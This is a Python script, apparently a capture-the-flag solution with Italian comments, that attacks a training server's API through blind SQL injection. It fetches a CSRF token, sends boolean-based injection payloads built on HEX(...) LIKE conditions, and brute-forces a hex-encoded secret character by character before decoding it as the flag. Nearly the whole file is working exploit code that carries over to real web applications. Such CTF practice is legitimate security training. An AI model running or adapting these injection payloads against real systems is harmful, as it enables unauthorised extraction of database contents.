import requests


class Inj:
    def __init__(self, host):

        self.sess = requests.Session() # Start the session. We want to save the cookies
        self.base_url = '{}/api/'.format(host)
        self._refresh_csrf_token() # Refresh the ANTI-CSRF token

    def _refresh_csrf_token(self):
        resp = self.sess.get(self.base_url + 'get_token')
        resp = resp.json()
        self.token = resp['token']

    def _do_raw_req(self, url, query):
        headers = {'X-CSRFToken': self.token}
        data = {'query': query }
        return self.sess.post(url,json=data, headers=headers).json()

    def logic(self, query):
        url = self.base_url + 'logic'
        response = self._do_raw_req(url, query)
        return response['result'], response['sql_error']

    def union(self, query):
        url = self.base_url + 'union'
        response = self._do_raw_req(url, query)
        return response['result'], response['sql_error']

    def blind(self, query):
        url = self.base_url + 'blind'
        response = self._do_raw_req(url, query)
        return response['result'], response['sql_error']

    def time(self, query):
        url = self.base_url + 'time'
        response = self._do_raw_req(url, query)
        return response['result'], response['sql_error']
    
inj = Inj('http://web-17.challs.olicyber.it')
# non si ha l'output quindi si dovrà tentare un brute force per capire se il carattere appartiene o meno alla stringa
# il risultato riguardante se un carattere appartiene o meno dipende dall condizione dopo il where
# codifico la parola secret in hex per ridurre i caratteri da testare 0-F
# chiedo se il primo carattere è uno 0(failure), ma è un 5(success)
response, error = inj.blind("1' AND (SELECT 1 WHERE HEX('SECRET') LIKE '5%')='1")
print(response)

# script to brute force the flag iterating over the dictionary
print("Starting script...")
inj = Inj('http://web-17.challs.olicyber.it')

dictionary = '0123456789abcdef'
result = ''
position = 0

while True:
    position+=1
    for c in dictionary:
        question = f"1' and (select 1 from secret where HEX(asecret) LIKE '{result+c}%')='1"
        response, error = inj.blind(question)
        if response == 'Success': # We have a match!
            result += c
            print(f"Founded the character {c} belonging to flag in position {position}")
            break
    else:
        break
print(f"Flag found ---> {result}")
print(f"Starting decoding flag from hex to str...")
print(bytes.fromhex(result).decode('utf-8'))